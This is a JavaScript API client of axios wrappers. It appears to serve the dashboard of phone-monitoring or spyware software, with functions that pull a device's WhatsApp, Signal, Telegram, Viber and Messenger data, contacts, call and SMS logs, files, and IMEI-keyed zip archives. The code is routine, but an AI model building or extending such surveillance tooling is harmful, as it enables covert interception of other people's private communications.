import axios from "axios";

const { url, requestConfig, routes } = require("config.js")();

///done redux detach-----------------------------------------
export const getApps= async (body, cb) => {
  try {
    const res = await axios.post(
      `${url}${routes.getApps}`,
      body,
      requestConfig
    );
    cb(res.data);
  } catch (e) {
    console.log(e);

    cb([]);
  }
};

export const requestReset = async (body, cb) => {
  try {
    console.log("call reset ", `${url}${routes.requestReset}`, body)
    const res = await axios.post(
      `${url}${routes.requestReset}`, body,
      requestConfig
    );
    cb(res.data);
  } catch (e) {
    console.log("request reset ", e);
    cb([]);
  }
};
//#done
export const getDevices = async (body, cb) => {
  try {
    const res = await axios.post(
      `${url}${routes.getDevices}`,
      body,
      requestConfig
    );
    cb(res.data);
  } catch (e) {
    console.log("get device ", e);
    cb([]);
  }
};

export const getWhatsappBusiness = async (body, cb) => {
  try {
    const res = await axios.post(
      `${url}${routes.getWhatsappBusiness}`,
      body,
      requestConfig
    );
    cb(res.data);
  } catch (e) {
    console.log(e);
    cb([]);
  }
};
//#done
export const getProtectedText = async (body, cb) => {
  try {
    const res = await axios.post(
      `${url}${routes.getProtectedText}`,
      body,
      requestConfig
    );
    cb(res.data);
  } catch (e) {
    console.log(e);
    cb([]);
  }
};
//#done
export const getImo = async (body, cb) => {
  try {
    const res = await axios.post(`${url}${routes.getImo}`, body, requestConfig);
    cb(res.data);
  } catch (e) {
    console.log(e);
    cb([]);
  }
};

export const getConion = async (body, cb) => {
  try {
    const res = await axios.post(
      `${url}${routes.getConion}`,
      body,
      requestConfig
    );
    cb(res.data);
  } catch (e) {
    console.log(e);
    cb([]);
  }
};

//#done
export const getViber = async (body, cb) => {
  try {
    const res = await axios.post(
      `${url}${routes.getViber}`,
      body,
      requestConfig
    );
    cb(res.data);
  } catch (e) {
    console.log(e);
    cb([]);
  }
};
//#done
export const getMessanger = async (body, cb) => {
  try {
    const res = await axios.post(
      `${url}${routes.getMessanger}`,
      body,
      requestConfig
    );
    cb(res.data);
  } catch (e) {
    console.log(e);
    cb([]);
  }
};
//#done
export const getSignal = async (body, cb) => {
  try {
    const res = await axios.post(
      `${url}${routes.getSignal}`,
      body,
      requestConfig
    );

    cb(res.data);
  } catch (e) {
    console.log(e);
    cb([]);
  }
};

//#done
export const getDeviceInfoX = async (body) => {
  try {
    const res = await axios.post(
      `${url}${routes.getDeviceInfo}`,
      body,
      requestConfig
    );
  } catch (e) {
    console.log(e);
  }
};
//#done
export const getDeviceInfo = async (body, cb) => {
  try {
    const res = await axios.post(
      `${url}${routes.getDeviceInfo}`,
      body,
      requestConfig
    );
    cb(res.data);
  } catch (e) {
    console.log(e);
    cb([]);
  }
};
//#done
export const getWhatsapp = async (body, cb) => {
  try {
    const res = await axios.post(
      `${url}${routes.getWhatsapp}`,
      body,
      requestConfig
    );

    cb(res.data);
  } catch (e) {
    console.log(e);

    cb([]);
  }
};
//#done
export const getTelegram = async (body, cb) => {
  try {
    const res = await axios.post(
      `${url}${routes.getTelegram}`,
      body,
      requestConfig
    );
    cb(res.data);
  } catch (e) {
    console.log(e);
    cb([]);
  }
};
//#done
export const cancelFile = async (body, cb) => {
  try {
    const res = await axios.post(
      `${url}${routes.cancelFile}`,
      body,
      requestConfig
    );
    cb(true);
  } catch (e) {
    console.log(e);
    cb(false);
  }
};
//#done
export const getFileListing = async (body, cb) => {
  console.log("body data", body);
  try {
    const res = await axios.post(
      `${url}${routes.getFileListing}`,
      body,
      requestConfig
    );

    cb(res.data);
  } catch (e) {
    console.log(e);
    cb(null);
  }
};
//#done
export const getInfo = async (body, cb) => {
  try {
    const res = await axios.post(
      `${url}${routes.getInfo}`,
      body,
      requestConfig
    );
    cb(res.data);
  } catch (e) {
    console.log(e);
    cb([]);
  }
};
//#done
export const getFile = async (body, cb) => {
  try {
    const res = await axios.post(
      `${url}${routes.getFile}`,
      body,
      requestConfig
    );

    cb();
  } catch (e) {
    console.log(e);
  }
};

//#in progress 
export const getFiles = async (body, cb) => {
  try {
    const res = await axios.post(
      `${url}${routes.getFiles}`,
      body,
      requestConfig
    );

    cb(true);
  } catch (e) {
    console.log(e);
    cb(false)
  }
};
//#done
export const getContacts = async (body, cb) => {
  try {
    const res = await axios.post(
      `${url}${routes.getContacts}`,
      body,
      requestConfig
    );
    cb(res.data);
  } catch (e) {
    console.log(e);
    cb([]);
  }
};

//#done
export const getCallLogs = async (body, cb) => {
  try {
    const res = await axios.post(
      `${url}${routes.getCallLogs}`,
      body,
      requestConfig
    );
    cb(res.data);
  } catch (e) {
    console.log(e);

    cb([]);
  }
};
//#done
export const getSmsLogs = async (body, cb) => {
  try {
    const res = await axios.post(
      `${url}${routes.getSmsLogs}`,
      body,
      requestConfig
    );
    cb(res.data);
  } catch (e) {
    console.log(e);

    cb([]);
  }
};

export const downloadZipFile = async ({ imei }) => {
  try {
    console.log(`${url}${routes.getZipFiles}?imei=${imei}`);
    document.getElementById(
      "iframe"
    ).src = `${url}${routes.getZipFiles}?imei=${imei}`;
    // document.body.appendChild(ifr)
    return true;
  } catch (err) {
    console.log("error to get zip", err);
    return false;
  }
};

export const moveToTrash = async (body, cb) => {
  try {
    await axios.post(`${url}${routes.moveToTrash}`, body, requestConfig);

    cb();
  } catch (e) {
    console.log(e);
  }
};

export const deletePermanently = async (body, cb) => {
  try {
    await axios.post(`${url}${routes.deletePermanently}`, body, requestConfig);

    cb();
  } catch (e) {
    console.log(e);
  }
};

export const moveToInbox = async (body, cb) => {
  try {
    await axios.post(`${url}${routes.moveToInbox}`, body, requestConfig);
    cb();
  } catch (e) {
    console.log(e);
  }
};

export const saveData = async (body, cb) => {
  try {
    await axios.post(`${url}${routes.saveData}`, body, requestConfig);

    cb();
  } catch (e) {
    console.log(e);
  }
};



export const downloadFiles = async (body, cb) => {
  try {
    const responce = await axios.post(`${url}${routes.downloadFiles}`, body, {
      headers: {
        'Content-Disposition': "attachment",
        'Content-Type': 'application/json',
        'Accept': 'application/octet-stream'
      },
      responseType: 'arraybuffer'
    });

    cb(responce);
  } catch (e) {
    console.log(e);
    cb(null);
  }
};